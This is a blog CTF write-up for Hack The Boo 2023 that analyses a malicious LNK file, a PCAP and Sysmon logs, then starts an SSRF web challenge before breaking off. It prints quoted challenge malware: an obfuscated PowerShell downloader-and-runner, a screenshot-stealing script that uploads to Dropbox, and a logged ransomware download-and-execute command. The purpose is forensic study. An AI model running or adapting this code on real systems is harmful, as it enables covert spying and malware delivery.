<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807375038140">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.11.0">

    <!-- Primary Meta Tags -->
    <title>Hack The Boo 2023 - Forensics and Web</title>
    <meta name="title" content="Hack The Boo 2023 - Forensics and Web">
    <meta name="description" content="For this years halloween I decided to participate in the Hack The Boo CTF competition from Hack the Box.">

    <!-- Canonical -->
    <link rel="canonical" href="https://bytebl33d.github.io/writeups/ctf/htboo-forensics-reversing/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://bytebl33d.github.io/writeups/ctf/htboo-forensics-reversing/">
    <meta property="og:title" content="Hack The Boo 2023 - Forensics and Web">
    <meta property="og:description" content="For this years halloween I decided to participate in the Hack The Boo CTF competition from Hack the Box.">
    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/htboo-ctf-2023.jpg">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/ctf/htboo-forensics-reversing/">
    <meta property="twitter:title" content="Hack The Boo 2023 - Forensics and Web">
    <meta property="twitter:description" content="For this years halloween I decided to participate in the Hack The Boo CTF competition from Hack the Box.">
    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/htboo-ctf-2023.jpg">

    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>

    <link href="../../../resources/css/retype.css?v=3.11.0.807375038140" rel="stylesheet">

    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.11.0.807375038140" defer></script>
</head>
<body>
    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
    
        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="retype-branding-logo" href="../../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav id="retype-header-nav" class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../blog/">Posts</a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="retype-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
    
        <div id="retype-container" class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
            
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../blog/">Posts</a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 bg-body-bg">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="retype-markdown" id="retype-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="retype-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="hack-the-boo-2023---forensics-and-web" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#hack-the-boo-2023---forensics-and-web">#</doc-anchor-trigger>
        <span>Hack The Boo 2023 - Forensics and Web</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
    <div>In&nbsp;</div>
    <div><a href="../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
    <div><a href="../../../categories/ctf/">CTF</a>,&nbsp;</div>
    <div><a href="../../../categories/dfir/">DFIR</a>,&nbsp;</div>
    <div><a href="../../../categories/web-exploitation/">Web-Exploitation</a></div>
    <div class="mx-2">&#9679;</div>
    <div class="flex items-center shrink-0">Published&nbsp;<span>2023-10-28</span></div>
</div>

<p><figure class="content-center">
    <img src="../../../assets/images/headers/htboo-ctf-2023.jpg" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>For this years halloween I decided to participate in the Hack The Boo CTF competition from Hack the Box. Despite this being my first solo public CTF competition, I still managed to climb to leaderboards and reach top 50 (48th to be exact). In total I managed to capture 7 out of the 10 flags, some easier than others. In this post I will delve into how I managed to solve the forensics and web challenges, as those where the areas my skills stuck out the most.</p>
<doc-anchor-target id="forensics---trick-or-treat">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#forensics---trick-or-treat">#</doc-anchor-trigger>
        <span>Forensics - Trick or Treat</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="description">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#description">#</doc-anchor-trigger>
        <span>Description</span>
    </h3>
</doc-anchor-target>
<p>Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject &quot;Trick or Treat&quot; and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn&#x27;t so scary; maybe the season is not so spooky after all.</p>
<doc-anchor-target id="lnk-file">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#lnk-file">#</doc-anchor-trigger>
        <span>LNK File</span>
    </h3>
</doc-anchor-target>
<p>We start our investigation by analyzing the <code v-pre>.lnk</code> file with <code v-pre>exiftools</code> by executing <code v-pre>exiftools trick_or_treat.lnk</code> on the file. Inside the file information we find something strange:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">Working Directory               : C:
Command Line Arguments          : /k for /f &quot;tokens=*&quot; %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a -windowstyle hidden &quot;$asvods ='';$UserAgents = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko');$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add('User-Agent', $RandomUserAgent);$boddmei = $WebClient.DownloadString('http://windowsliveupdater.com');$vurnwos ='';for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));
Icon File Name                  : C:\Windows\System32\shell32.dl</code></pre>
</doc-codeblock></div>
<p>Let us take some time to analyze the behavior. The script first selects a random User-Agent from the crafted <code v-pre>$UserAgents</code> array. It then uses a WebClient to download the contents of the specified URL (<a href="http://windowsliveupdater.com">http://windowsliveupdater.com</a>) and decodes the obfuscated file as follows:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">$vurnwos ='';
for($i=0;$i -le $boddmei.Length-2;$i=$i+2){
    $bodms=$boddmei[$i]+$boddmei[$i+1];
    $decodedChar = [char]([convert]::ToInt16($bodms, 16));
    $xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);
    $vurnwos = $vurnwos + $xoredChar
};</code></pre>
</doc-codeblock></div>
<p>This essentially performs an XOR operation with <code v-pre>0x1d</code> on every character in the downloaded file. This information might be useful later on in our investigations. Now lets proceed with the PCAP file.</p>
<doc-anchor-target id="pcap-file">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#pcap-file">#</doc-anchor-trigger>
        <span>PCAP File</span>
    </h3>
</doc-anchor-target>
<p>Inside the <code v-pre>.lnk</code> file we found that a request was made to a fake windows updater url. Looking at the <code v-pre>.pcap</code> file and searching for the domain, we find that the IP address leads to <code v-pre>77.74.198.52</code>. We select one of its requests and follow the HTTP stream. One of the packets contains a giant blob of random text:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">7b68737e697472733d596f726d5f726530486d71727c793d661717465e70797178695f...</code></pre>
</doc-codeblock></div>
<p>It looks like an encoded string and we know that we have to decode it with the XOR function we found previously. Now there are several ways to solve this. Either we use <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex(%27Auto%27)XOR(%7B%27option%27:%27Hex%27,%27string%27:%270x1d%27%7D,%27Standard%27,false)">CyberChef</a> and apply the XOR operation, or we can run the script ourselves in the tool from <a href="https://tio.run/#powershell">TryItOnline</a> by replacing the <code v-pre>$vurnwos</code> variable with the above string. Either way we retrieve the decoded script:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-bash"><code v-pre class="language-bash">function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias(&quot;f&quot;)]
        [string]$SourceFilePath
    )
    $DropBoxAccessToken = &quot;HTB{s4y_Pumpk1111111n!!!}&quot;
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath=&quot;/$outputFile&quot;
    $arg = '{ &quot;path&quot;: &quot;' + $TargetFilePath + '&quot;, &quot;mode&quot;: &quot;add&quot;, &quot;autorename&quot;: true, &quot;mute&quot;: false }'
    $authorization = &quot;Bearer &quot; + $DropBoxAccessToken
    $headers = New-Object &quot;System.Collections.Generic.Dictionary[[String],[String]]&quot;
    $headers.Add(&quot;Authorization&quot;, $authorization)
    $headers.Add(&quot;Dropbox-API-Arg&quot;, $arg)
    $headers.Add(&quot;Content-Type&quot;, 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

while(1){
  Add-Type -AssemblyName System.Windows.Forms,System.Drawing
  $screens = [Windows.Forms.Screen]::AllScreens
  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)
  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

  $bmp.Save(&quot;$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png&quot;)
  $graphics.Dispose()
  $bmp.Dispose()
  
  start-sleep -Seconds 15
 &quot;$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png&quot; | DropBox-Upload
}</code></pre>
</doc-codeblock></div>
<p>Inside we find our flag as the DropBox AccessToken.</p>
<doc-anchor-target id="forensics---valhalloween">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#forensics---valhalloween">#</doc-anchor-trigger>
        <span>Forensics - Valhalloween</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="description-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#description-1">#</doc-anchor-trigger>
        <span>Description</span>
    </h3>
</doc-anchor-target>
<p>As I was walking the neighbor&#x27;s streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as &quot;The God of Mischief!&quot;. He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it into my computer, all my files were corrupted! First, spawn the haunted Docker instance and connect to it! Dig through the horrors that lie in the given Logs and answer whatever questions are asked of you!</p>
<doc-anchor-target id="sysmon-analysis">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sysmon-analysis">#</doc-anchor-trigger>
        <span>Sysmon Analysis</span>
    </h3>
</doc-anchor-target>
<p>For this challenge we are given some Windows Event Logs. For dealing with <code v-pre>.evtx</code> files on Linux we can use an <a href="https://github.com/Velocidex/evtx">EVTX Parser</a>. We are only interested in the Sysmon logs so</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-bash"><code v-pre class="language-bash">./dumpevtx parse Microsoft-Windows-Sysmon%4Operational.evtx &gt; sysmon.log</code></pre>
</doc-codeblock></div>
<p>Alternatively, we can also use Chainsaw to quickly hunt for Windows Artifacts:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-bash"><code v-pre class="language-bash">./chainsaw hunt Logs/ -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml</code></pre>
</doc-codeblock></div>
<p>Now we can more easily search through the event log. Let&#x27;s connect to the docker instance and try to answer some questions.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)</code></pre>
</doc-codeblock></div>
<p>Because we need to find where the ransomware came from, we can search for the string <code v-pre>http://</code>. In one of the results we can see that a command has been triggered:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">c:\\\\microsoft\\\\office\\\\word\\\\document\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe /c powershell.exe (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','%%temp%%\\mscalc.exe');start-process '%%temp%%\\mscalc.exe'</code></pre>
</doc-codeblock></div>
<p>This reveals that the ransomwhere was downloaded from <code v-pre>103.162.14.116:8888</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)</code></pre>
</doc-codeblock></div>
<p>From the issued command, a process is started with the name <code v-pre>mscalc.exe</code>. To find where this program has been launched we can look for this name in the Image field of the logs. Then looking at the Hashes field, we can find the MD5 hash to be <code v-pre>B94F3FF666D9781CB69088658CD53772</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)</code></pre>
</doc-codeblock></div>
<p>A quick search on VirusTotal shows that we are dealing with the <code v-pre>LokiLocker</code> ransomwhere.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)</code></pre>
</doc-codeblock></div>
<p>Seaching for <code v-pre>schtasks</code> we can again find that a command has been run. This command shedules an ONLOGON task with the name <code v-pre>Loki</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)</code></pre>
</doc-codeblock></div>
<p>We can look for when the process is started by searching for <code v-pre>start-process</code>. The first Event that runs the malicious program executes it via <code v-pre>powershell.exe</code> with a process ID of <code v-pre>3856</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\Data\KCorp\FirstStage.pdf)</code></pre>
</doc-codeblock></div>
<p>Following the PPID we find that the command is issued inside the <code v-pre>C:\Users\HoaGay\Documents\Subjects</code> folder. Searching for this directory we can find all the documents that were opend by this user. After opening the document <code v-pre>C:\Users\HoaGay\Documents\Subjects\Unexpe.docx</code> we see that the initial download stage begins.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)</code></pre>
</doc-codeblock></div>
<p>This can be found in the <code v-pre>UtcTime</code> field of the previous event. After submitting all these answers, we get the flag and have solved the forensics challenges.</p>
<doc-anchor-target id="web---hauntmart">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#web---hauntmart">#</doc-anchor-trigger>
        <span>Web - HauntMart</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="description-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#description-2">#</doc-anchor-trigger>
        <span>Description</span>
    </h3>
</doc-anchor-target>
<p>An eerie expedition into the world of online retail, where the most sinister and spine-tingling inventory reigns supreme. Can you take it down?</p>
<doc-anchor-target id="browsing-the-website">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#browsing-the-website">#</doc-anchor-trigger>
        <span>Browsing the website</span>
    </h3>
</doc-anchor-target>
<p>Looking through the website we can register with an account. After logging in the only functionality seems to be the sell products page.
On this page we add products to the site that gets reviewed by the moderators. What stands out here is the &#x27;manual&#x27; field where we can specify a link to a product. Lets dig into the source code a bit.</p>
<doc-anchor-target id="source-code-analysis">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code-analysis">#</doc-anchor-trigger>
        <span>Source code analysis</span>
    </h3>
</doc-anchor-target>
<p>In the <code v-pre>index.html</code> file we see that if we have the admin role, we can see the flag.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">{% raw %}
{% if user['role'] == 'admin' %}
{{flag}}
{% endif %}
{% endraw %}</code></pre>
</doc-codeblock></div>
<p>Now how can we get the admin role? Well, conveniently there is a function called <code v-pre>makeUserAdmin</code> being used in the <code v-pre>/addAdmin</code> endpoint. Looking in the <code v-pre>util.py</code> file we see that the <code v-pre>downloadManual(url)</code> function does some simple checks against the url we put in.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-python"><code v-pre class="language-python">blocked_host = [&quot;127.0.0.1&quot;, &quot;localhost&quot;, &quot;0.0.0.0&quot;]
def isSafeUrl(url):
    for hosts in blocked_host:
        if hosts in url:
            return False
    return True</code></pre>
</doc-codeblock></div>
<p>This merely checks if our string includes the strings in the blocked_host array and can be bypassed by url encoding our input.
Next the function will send a request to fetch a file that comes after the last <code v-pre>/</code> character. The trick is to make this function make a request to the <code v-pre>/addAdmin</code> endpoint with our username as one of the request parameters.</p>
<doc-anchor-target id="exploiting-the-vulnerability">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#exploiting-the-vulnerability">#</doc-anchor-trigger>
